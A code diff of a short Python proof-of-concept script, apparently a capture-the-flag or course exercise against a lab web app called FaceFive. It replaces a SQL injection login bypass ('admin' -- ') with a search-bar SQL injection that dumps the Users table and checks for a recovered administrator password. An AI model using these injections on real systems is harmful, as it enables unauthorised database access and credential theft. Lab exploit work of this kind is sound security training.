@@ -1,19 +1,26 @@
-import requests, sys, os, random
+# vuln1.py
 
-SERVER = sys.argv[1]
+# PoC for SQL injection on th /friends endpoint
+#
+# the search bar allows for SQL injections which allow to read the entire DB
 
-session = requests.session()
+from tools import *
+import sys
+import os
 
-user = "admin' -- "
-password = "any"
+debug = 'DEBUG' in os.environ and os.environ['DEBUG'] == '1'
 
-params = {'password' : password, 'username' : user}
-r = session.post(SERVER + '/login', data=params)
+url = sys.argv[1]
 
-assert 'admin' in r.text
+session = FaceFiveSession(url)
 
-params = {}
-headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}
-r = requests.get(SERVER + '/profile', params=params, headers=headers, cookies=session.cookies)
+user = 'test'
+passwd = 'testpasswd'
 
-assert 'SSof{' in r.text
+reset_image(session)
+register(session, user, passwd)
+
+users = select_query(session, 'Users', 'username', 'password')
+
+print(users)
+assert ('administrator', 'AVeryL33tPasswd') in users
